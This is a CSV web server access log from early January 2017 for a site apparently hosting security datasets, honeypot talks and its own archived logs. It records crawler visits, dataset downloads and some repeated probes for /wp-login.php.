Log Format,Field 1,Field 2,Field 3,Field 4,Field 5,Field 6,Field 7
WSC,77.75.76.161,-,01/Jan/2017:17:41:51 -0800,GET /robots.txt HTTP/1.1,200,334
WSC,77.75.76.161,-,01/Jan/2017:17:41:53 -0800,GET /self.logs/?C=M;O=A HTTP/1.1,200,15036
WSC,88.198.16.153,-,01/Jan/2017:17:43:39 -0800,GET /robots.txt HTTP/1.0,200,252
WSC,88.198.16.153,-,01/Jan/2017:17:43:41 -0800,GET /honeypot//%22http://glastopf.org//%22 HTTP/1.0,404,284
WSC,88.198.16.153,-,01/Jan/2017:17:43:42 -0800,GET /honeypot//%22http://www.maxmind.com/%22 HTTP/1.0,404,303
WSC,88.198.16.153,-,01/Jan/2017:17:43:45 -0800,GET /honeypot//%22https://twitter.com/sooshie/%22 HTTP/1.0,404,303
WSC,88.198.16.153,-,01/Jan/2017:17:43:47 -0800,GET /honeypot//%22https://twitter.com/theroxyd/%22 HTTP/1.0,404,303
WSC,180.76.15.140,-,01/Jan/2017:17:47:24 -0800,GET /honeypot/Honeypot%20-%20Howto.pdf HTTP/1.1,200,778180
WSC,68.180.228.229,-,01/Jan/2017:17:54:56 -0800,GET /self.logs/error.log.2015-08-06.gz HTTP/1.1,200,673
WSC,88.185.102.251,-,01/Jan/2017:18:16:08 -0800,GET /wp-login.php HTTP/1.1,404,295
WSC,88.185.102.251,-,01/Jan/2017:18:16:13 -0800,GET /wp-login.php HTTP/1.1,404,295
WSC,88.185.102.251,-,01/Jan/2017:18:16:18 -0800,GET / HTTP/1.1,200,34374
WSC,52.212.146.96,-,01/Jan/2017:18:30:01 -0800,GET /self.logs/access.log.2016-12-26.gz HTTP/1.1,200,8898
WSC,52.212.146.96,-,01/Jan/2017:18:30:02 -0800,GET /self.logs/access.log.2016-12-27.gz HTTP/1.1,200,30979
WSC,52.212.146.96,-,01/Jan/2017:18:30:02 -0800,GET /self.logs/access.log.2016-12-28.gz HTTP/1.1,200,28379
WSC,52.212.146.96,-,01/Jan/2017:18:30:02 -0800,GET /self.logs/access.log.2016-12-29.gz HTTP/1.1,200,8909
WSC,52.212.146.96,-,01/Jan/2017:18:30:02 -0800,GET /self.logs/access.log.2016-12-30.gz HTTP/1.1,404,340
WSC,52.212.146.96,-,01/Jan/2017:18:30:03 -0800,GET /self.logs/access.log.2016-12-31.gz HTTP/1.1,404,340
WSC,52.212.146.96,-,01/Jan/2017:18:30:03 -0800,GET /self.logs/access.log.2017-01-01.gz HTTP/1.1,404,340
WSC,123.125.71.85,-,01/Jan/2017:18:30:33 -0800,GET /robots.txt HTTP/1.1,200,297
WSC,185.100.84.82,-,01/Jan/2017:19:52:36 -0800,GET / HTTP/1.1,301,446
WSC,31.185.104.21,-,01/Jan/2017:19:52:51 -0800,GET / HTTP/1.1,200,10230
WSC,180.121.191.241,-,01/Jan/2017:20:11:01 -0800,GET /honeypot/BSidesDFW%20-%202014.ipynb HTTP/1.1,200,455928
WSC,68.54.170.68,-,01/Jan/2017:20:23:41 -0800,GET /wp-login.php HTTP/1.1,404,295
WSC,68.54.170.68,-,01/Jan/2017:20:23:47 -0800,GET /wp-login.php HTTP/1.1,404,295
WSC,68.54.170.68,-,01/Jan/2017:20:23:52 -0800,GET / HTTP/1.1,200,34374
WSC,211.210.103.197,-,01/Jan/2017:20:44:40 -0800,GET / HTTP/1.1,200,10267
WSC,211.210.103.197,-,01/Jan/2017:20:44:40 -0800,GET /twitter-icon.png HTTP/1.1,200,27787
WSC,211.210.103.197,-,01/Jan/2017:20:44:41 -0800,GET /GitHub-Mark.png HTTP/1.1,200,7428
WSC,211.210.103.197,-,01/Jan/2017:20:44:41 -0800,GET /bootstrap/img/favicon.ico HTTP/1.1,200,589
WSC,103.21.125.85,-,01/Jan/2017:20:17:29 -0800,GET /maccdc2012/conn.log.gz HTTP/1.1,200,551041579
WSC,103.21.125.85,-,01/Jan/2017:20:17:29 -0800,GET /maccdc2012/conn.log.gz HTTP/1.1,200,551041579
WSC,103.21.125.85,-,01/Jan/2017:20:17:29 -0800,GET /maccdc2012/conn.log.gz HTTP/1.1,200,551041579
WSC,103.21.125.85,-,01/Jan/2017:20:17:29 -0800,GET /maccdc2012/conn.log.gz HTTP/1.1,200,551041579
WSC,103.21.125.85,-,01/Jan/2017:20:17:29 -0800,GET /maccdc2012/conn.log.gz HTTP/1.1,200,436252007
WSC,157.49.22.184,-,01/Jan/2017:22:00:48 -0800,GET / HTTP/1.1,200,10267
WSC,157.49.22.184,-,01/Jan/2017:22:00:49 -0800,GET /bootstrap/img/favicon.ico HTTP/1.1,200,589
WSC,157.49.22.184,-,01/Jan/2017:22:00:50 -0800,GET /GitHub-Mark.png HTTP/1.1,200,7428
WSC,157.49.22.184,-,01/Jan/2017:22:00:49 -0800,GET /twitter-icon.png HTTP/1.1,200,27787
WSC,211.42.54.241,-,01/Jan/2017:22:13:11 -0800,GET / HTTP/1.1,301,483
WSC,211.42.54.241,-,01/Jan/2017:22:13:12 -0800,GET / HTTP/1.1,200,10267
WSC,211.42.54.241,-,01/Jan/2017:22:13:13 -0800,GET /twitter-icon.png HTTP/1.1,200,27787
WSC,211.42.54.241,-,01/Jan/2017:22:13:13 -0800,GET /GitHub-Mark.png HTTP/1.1,200,7428
WSC,211.42.54.241,-,01/Jan/2017:22:13:13 -0800,GET /bootstrap/img/favicon.ico HTTP/1.1,200,589
WSC,211.42.54.241,-,01/Jan/2017:22:15:58 -0800,GET /pe_static/zeus.zip HTTP/1.1,200,4493880
WSC,5.106.255.253,-,01/Jan/2017:22:24:05 -0800,GET / HTTP/1.1,200,10267
WSC,5.106.255.253,-,01/Jan/2017:22:24:07 -0800,GET /GitHub-Mark.png HTTP/1.1,200,7428
WSC,5.106.255.253,-,01/Jan/2017:22:24:07 -0800,GET /twitter-icon.png HTTP/1.1,200,27787
WSC,5.106.255.253,-,01/Jan/2017:22:24:07 -0800,GET / HTTP/1.1,200,10267
WSC,5.106.255.253,-,01/Jan/2017:22:24:09 -0800,GET /bootstrap/img/favicon.ico HTTP/1.1,200,589
WSC,5.106.255.253,-,01/Jan/2017:22:24:48 -0800,GET /maccdc2012/smtp.log.gz HTTP/1.1,200,6846
WSC,5.106.255.253,-,01/Jan/2017:22:26:14 -0800,GET / HTTP/1.1,200,10267
WSC,5.106.255.253,-,01/Jan/2017:22:26:14 -0800,GET /twitter-icon.png HTTP/1.1,304,165
WSC,5.106.255.253,-,01/Jan/2017:22:26:15 -0800,GET /GitHub-Mark.png HTTP/1.1,304,166
WSC,5.106.255.253,-,01/Jan/2017:22:26:16 -0800,GET /bootstrap/img/favicon.ico HTTP/1.1,304,164
WSC,5.106.255.253,-,01/Jan/2017:22:26:24 -0800,GET /maccdc2012/smtp.log.gz HTTP/1.1,304,189
WSC,42.236.10.100,-,01/Jan/2017:22:34:16 -0800,GET / HTTP/1.1,200,10267
WSC,42.236.10.100,-,01/Jan/2017:22:34:16 -0800,GET /robots.txt HTTP/1.1,200,334
WSC,164.124.106.147,-,01/Jan/2017:22:42:26 -0800,GET / HTTP/1.1,200,10267
WSC,164.124.106.147,-,01/Jan/2017:22:42:27 -0800,GET /GitHub-Mark.png HTTP/1.1,200,7428
WSC,164.124.106.147,-,01/Jan/2017:22:42:27 -0800,GET /twitter-icon.png HTTP/1.1,200,27787
WSC,164.124.106.147,-,01/Jan/2017:22:42:29 -0800,GET /bootstrap/img/favicon.ico HTTP/1.1,200,590
WSC,199.16.157.181,-,01/Jan/2017:22:56:56 -0800,GET /robots.txt HTTP/1.1,200,233
WSC,199.16.157.181,-,01/Jan/2017:22:56:56 -0800,GET / HTTP/1.1,200,10211
WSC,62.81.238.27,-,01/Jan/2017:23:19:01 -0800,GET /bootstrap/img/favicon.ico HTTP/1.1,304,165
WSC,157.55.39.232,-,01/Jan/2017:23:31:41 -0800,GET /self.logs/access.log.2015-06-30.gz HTTP/1.1,200,5358
WSC,54.234.67.133,-,01/Jan/2017:23:35:09 -0800,HEAD / HTTP/1.1,301,209
WSC,54.234.67.133,-,01/Jan/2017:23:35:09 -0800,HEAD / HTTP/1.1,200,284
WSC,109.66.159.240,-,01/Jan/2017:23:40:13 -0800,GET / HTTP/1.1,200,10267
WSC,109.66.159.240,-,01/Jan/2017:23:40:13 -0800,GET /bootstrap/img/favicon.ico HTTP/1.1,200,589
WSC,109.66.159.240,-,01/Jan/2017:23:40:13 -0800,GET /twitter-icon.png HTTP/1.1,200,27787
WSC,109.66.159.240,-,01/Jan/2017:23:40:14 -0800,GET /GitHub-Mark.png HTTP/1.1,200,7428
WSC,109.66.159.240,-,01/Jan/2017:23:40:50 -0800,GET /self.logs/ HTTP/1.1,200,14700
WSC,109.66.159.240,-,01/Jan/2017:23:40:51 -0800,GET /favicon.ico HTTP/1.1,200,267
WSC,109.66.159.240,-,01/Jan/2017:23:41:04 -0800,GET /self.logs/access.log.2015-01-17.gz HTTP/1.1,200,3597
WSC,109.66.159.240,-,01/Jan/2017:23:41:17 -0800,GET /self.logs/access.log.2015-01-17.gz HTTP/1.1,200,3597
WSC,118.33.113.8,-,01/Jan/2017:23:43:25 -0800,GET / HTTP/1.1,200,10267
WSC,118.33.113.8,-,01/Jan/2017:23:43:26 -0800,GET /twitter-icon.png HTTP/1.1,200,27787
WSC,118.33.113.8,-,01/Jan/2017:23:43:26 -0800,GET /GitHub-Mark.png HTTP/1.1,200,7428
WSC,118.33.113.8,-,01/Jan/2017:23:43:26 -0800,GET /bootstrap/img/favicon.ico HTTP/1.1,200,589
WSC,118.33.113.8,-,01/Jan/2017:23:44:34 -0800,GET /maccdc2012/weird.log.gz HTTP/1.1,200,1242777
WSC,109.66.159.240,-,01/Jan/2017:23:45:02 -0800,GET /Security-Data-Analysis/Lab_1/conn.log.zip HTTP/1.1,200,4557648
WSC,109.66.159.240,-,01/Jan/2017:23:45:57 -0800,GET /self.logs/ HTTP/1.1,200,14700
WSC,211.110.178.7,-,01/Jan/2017:23:46:28 -0800,GET / HTTP/1.1,200,34374
WSC,211.244.83.219,-,01/Jan/2017:23:46:29 -0800,GET / HTTP/1.1,200,34374
WSC,118.33.113.8,-,01/Jan/2017:23:47:08 -0800,GET / HTTP/1.1,200,10267
WSC,118.33.113.8,-,01/Jan/2017:23:47:09 -0800,GET /twitter-icon.png HTTP/1.1,200,27787
WSC,118.33.113.8,-,01/Jan/2017:23:47:09 -0800,GET /GitHub-Mark.png HTTP/1.1,200,7428
WSC,118.33.113.8,-,01/Jan/2017:23:47:10 -0800,GET /bootstrap/img/favicon.ico HTTP/1.1,200,589
WSC,118.33.113.8,-,01/Jan/2017:23:46:15 -0800,GET /maccdc2012/http.log.gz HTTP/1.1,200,54258816
WSC,104.200.107.62,-,01/Jan/2017:23:54:30 -0800,GET /wp-login.php HTTP/1.1,404,295
WSC,104.200.107.62,-,01/Jan/2017:23:54:35 -0800,GET /wp-login.php HTTP/1.1,404,295
WSC,104.200.107.62,-,01/Jan/2017:23:54:41 -0800,GET / HTTP/1.1,200,34374
WSC,109.66.159.240,-,01/Jan/2017:23:45:01 -0800,GET /Security-Data-Analysis/Lab_1/conn.log.zip HTTP/1.1,200,549098528
WSC,121.52.146.107,-,02/Jan/2017:00:06:02 -0800,GET / HTTP/1.0,200,10267
WSC,121.52.146.107,-,02/Jan/2017:00:06:03 -0800,GET /bootstrap/img/favicon.ico HTTP/1.0,200,589
WSC,121.52.146.107,-,02/Jan/2017:00:06:04 -0800,GET /twitter-icon.png HTTP/1.0,200,27787
WSC,121.52.146.107,-,02/Jan/2017:00:06:04 -0800,GET /GitHub-Mark.png HTTP/1.0,200,7428
WSC,121.52.146.107,-,02/Jan/2017:00:08:00 -0800,GET /favicon.ico HTTP/1.0,200,268
WSC,117.200.32.210,-,02/Jan/2017:00:12:41 -0800,GET /wp-login.php HTTP/1.1,404,295
WSC,111.91.137.215,-,02/Jan/2017:00:16:51 -0800,GET / HTTP/1.1,200,10267
WSC,111.91.137.215,-,02/Jan/2017:00:16:51 -0800,GET /twitter-icon.png HTTP/1.1,200,27787
WSC,111.91.137.215,-,02/Jan/2017:00:16:51 -0800,GET /GitHub-Mark.png HTTP/1.1,200,7428
WSC,111.91.137.215,-,02/Jan/2017:00:16:52 -0800,GET /bootstrap/img/favicon.ico HTTP/1.1,200,589
WSC,87.201.213.114,-,02/Jan/2017:00:27:55 -0800,GET /honeypot/Honeypot%20-%20Howto.pdf HTTP/1.1,206,34291
WSC,87.201.213.114,-,02/Jan/2017:00:27:53 -0800,GET /honeypot/Honeypot%20-%20Howto.pdf HTTP/1.1,200,1279418
WSC,87.201.213.114,-,02/Jan/2017:00:27:55 -0800,GET /honeypot/Honeypot%20-%20Howto.pdf HTTP/1.1,206,65874
WSC,87.201.213.114,-,02/Jan/2017:00:27:56 -0800,GET /favicon.ico HTTP/1.1,200,267
WSC,118.33.113.8,-,02/Jan/2017:00:31:41 -0800,GET / HTTP/1.1,200,10267
WSC,118.33.113.8,-,02/Jan/2017:00:31:41 -0800,GET /favicon.ico HTTP/1.1,200,267
WSC,27.5.119.139,-,02/Jan/2017:00:32:08 -0800,GET / HTTP/1.1,200,10267
WSC,27.5.119.139,-,02/Jan/2017:00:32:08 -0800,GET /twitter-icon.png HTTP/1.1,200,27787
WSC,27.5.119.139,-,02/Jan/2017:00:32:08 -0800,GET /GitHub-Mark.png HTTP/1.1,200,7428
WSC,27.5.119.139,-,02/Jan/2017:00:32:09 -0800,GET /bootstrap/img/favicon.ico HTTP/1.1,200,589
WSC,83.42.194.191,-,02/Jan/2017:00:46:00 -0800,GET / HTTP/1.1,200,10267
WSC,83.42.194.191,-,02/Jan/2017:00:46:00 -0800,GET /GitHub-Mark.png HTTP/1.1,200,7428
WSC,83.42.194.191,-,02/Jan/2017:00:46:00 -0800,GET /twitter-icon.png HTTP/1.1,200,27787
WSC,83.42.194.191,-,02/Jan/2017:00:46:01 -0800,GET /bootstrap/img/favicon.ico HTTP/1.1,200,589
WSC,109.86.71.185,-,02/Jan/2017:01:10:10 -0800,GET / HTTP/1.0,301,461
WSC,109.86.71.185,-,02/Jan/2017:01:10:10 -0800,GET / HTTP/1.0,200,34363
WSC,87.255.155.12,-,02/Jan/2017:01:18:56 -0800,GET / HTTP/1.1,200,10267
WSC,87.255.155.12,-,02/Jan/2017:01:18:56 -0800,GET /twitter-icon.png HTTP/1.1,200,27787
WSC,87.255.155.12,-,02/Jan/2017:01:18:57 -0800,GET /GitHub-Mark.png HTTP/1.1,200,7428
WSC,87.255.155.12,-,02/Jan/2017:01:18:58 -0800,GET /bootstrap/img/favicon.ico HTTP/1.1,200,590
WSC,109.64.164.19,-,02/Jan/2017:01:23:33 -0800,GET / HTTP/1.1,200,10267
WSC,109.64.164.19,-,02/Jan/2017:01:23:34 -0800,GET /GitHub-Mark.png HTTP/1.1,200,7427
WSC,109.64.164.19,-,02/Jan/2017:01:23:34 -0800,GET /bootstrap/img/favicon.ico HTTP/1.1,200,589
WSC,140.112.24.181,-,02/Jan/2017:01:26:20 -0800,GET /honeypot/Honeypot%20-%20Howto.pdf HTTP/1.1,206,34291
WSC,140.112.24.181,-,02/Jan/2017:01:26:20 -0800,GET /honeypot/Honeypot%20-%20Howto.pdf HTTP/1.1,206,65872
WSC,140.112.24.217,-,02/Jan/2017:01:26:20 -0800,GET /honeypot/Honeypot%20-%20Howto.pdf HTTP/1.1,206,65873
WSC,140.112.24.213,-,02/Jan/2017:01:26:21 -0800,GET /honeypot/Honeypot%20-%20Howto.pdf HTTP/1.1,206,65875
WSC,140.112.24.181,-,02/Jan/2017:01:26:21 -0800,GET /honeypot/Honeypot%20-%20Howto.pdf HTTP/1.1,206,65872
WSC,140.112.24.217,-,02/Jan/2017:01:26:21 -0800,GET /honeypot/Honeypot%20-%20Howto.pdf HTTP/1.1,206,262482
WSC,140.112.24.247,-,02/Jan/2017:01:26:16 -0800,GET /honeypot/Honeypot%20-%20Howto.pdf HTTP/1.1,200,1279418
WSC,140.112.24.223,-,02/Jan/2017:01:26:28 -0800,GET /favicon.ico HTTP/1.1,200,268
WSC,188.25.158.195,-,02/Jan/2017:01:34:38 -0800,GET / HTTP/1.1,200,10267
WSC,188.25.158.195,-,02/Jan/2017:01:34:39 -0800,GET /GitHub-Mark.png HTTP/1.1,200,7428
WSC,188.25.158.195,-,02/Jan/2017:01:34:39 -0800,GET /twitter-icon.png HTTP/1.1,200,27787
WSC,188.25.158.195,-,02/Jan/2017:01:34:39 -0800,GET /bootstrap/img/favicon.ico HTTP/1.1,200,589
WSC,1.202.222.146,-,02/Jan/2017:01:34:42 -0800,GET /favicon.ico HTTP/1.1,200,212
WSC,188.25.158.195,-,02/Jan/2017:01:35:53 -0800,GET /maccdc2012/ssl.log.gz HTTP/1.1,200,1313675
WSC,103.195.73.100,-,02/Jan/2017:01:37:32 -0800,GET /wp-login.php HTTP/1.1,404,295
WSC,103.195.73.100,-,02/Jan/2017:01:37:38 -0800,GET /wp-login.php HTTP/1.1,404,295
WSC,103.195.73.100,-,02/Jan/2017:01:37:46 -0800,GET / HTTP/1.1,200,34374
WSC,36.110.120.151,-,02/Jan/2017:01:41:53 -0800,GET /honeypot/Honeypot%20-%20Howto.pdf HTTP/1.1,200,1279418
WSC,46.229.164.102,-,02/Jan/2017:01:45:05 -0800,GET /robots.txt HTTP/1.1,301,465
WSC,46.229.164.102,-,02/Jan/2017:01:45:05 -0800,GET /robots.txt HTTP/1.1,200,297
WSC,211.249.40.21,-,02/Jan/2017:01:45:45 -0800,GET / HTTP/1.1,200,34363
WSC,211.249.40.24,-,02/Jan/2017:01:48:59 -0800,GET / HTTP/1.1,200,10267
WSC,211.249.40.24,-,02/Jan/2017:01:49:01 -0800,GET /bootstrap/img/favicon.ico HTTP/1.1,200,590
WSC,121.52.146.107,-,02/Jan/2017:01:53:58 -0800,GET / HTTP/1.0,200,10267
WSC,94.139.69.2,-,02/Jan/2017:01:54:49 -0800,GET /bootstrap/img/favicon.ico HTTP/1.1,200,590
WSC,155.94.170.213,-,02/Jan/2017:02:12:00 -0800,GET /honeypot/BSidesDFW%20-%202014.ipynb HTTP/1.0,200,930799
WSC,157.55.39.75,-,02/Jan/2017:02:12:39 -0800,GET /honeypot/bsidesdfw%20-%202014.ipynb HTTP/1.1,301,539
WSC,157.55.39.75,-,02/Jan/2017:02:12:56 -0800,GET /honeypot/bsidesdfw%20-%202014.ipynb HTTP/1.1,404,340
WSC,211.249.40.11,-,02/Jan/2017:02:25:26 -0800,GET / HTTP/1.1,200,34363
WSC,117.201.11.139,-,02/Jan/2017:02:35:43 -0800,GET /wp-login.php HTTP/1.1,404,295
WSC,117.201.11.139,-,02/Jan/2017:02:35:49 -0800,GET /wp-login.php HTTP/1.1,404,295
WSC,117.201.11.139,-,02/Jan/2017:02:35:54 -0800,GET / HTTP/1.1,200,34374
WSC,103.195.73.100,-,02/Jan/2017:02:35:55 -0800,GET /wp-login.php HTTP/1.1,301,522
WSC,103.195.73.100,-,02/Jan/2017:02:35:56 -0800,GET /wp-login.php HTTP/1.1,404,295
WSC,103.195.73.100,-,02/Jan/2017:02:36:01 -0800,GET /wp-login.php HTTP/1.1,301,522
WSC,103.195.73.100,-,02/Jan/2017:02:36:02 -0800,GET /wp-login.php HTTP/1.1,404,295
WSC,103.195.73.100,-,02/Jan/2017:02:36:09 -0800,GET / HTTP/1.1,301,498
WSC,103.195.73.100,-,02/Jan/2017:02:36:10 -0800,GET / HTTP/1.1,200,34374
WSC,78.68.160.67,-,02/Jan/2017:02:43:48 -0800,GET / HTTP/1.1,200,10267
WSC,78.68.160.67,-,02/Jan/2017:02:43:48 -0800,GET /apple-touch-icon-precomposed.png HTTP/1.1,404,340
WSC,78.68.160.67,-,02/Jan/2017:02:43:48 -0800,GET /apple-touch-icon.png HTTP/1.1,404,339
WSC,78.68.160.67,-,02/Jan/2017:02:43:48 -0800,GET /bootstrap/img/favicon.ico HTTP/1.1,200,589
WSC,78.68.160.67,-,02/Jan/2017:02:43:48 -0800,GET /apple-touch-icon-precomposed.png HTTP/1.1,404,339
WSC,78.68.160.67,-,02/Jan/2017:02:43:48 -0800,GET /apple-touch-icon.png HTTP/1.1,404,339
WSC,223.102.16.121,-,02/Jan/2017:02:46:01 -0800,GET /honeypot/Honeypot%20-%20Howto%20-%20BSides%20Austin.pdf HTTP/1.1,200,2928460
WSC,106.38.241.146,-,02/Jan/2017:02:55:56 -0800,GET /self.logs/ HTTP/1.1,200,14663
WSC,106.38.241.146,-,02/Jan/2017:02:56:27 -0800,GET /robots.txt HTTP/1.1,200,252
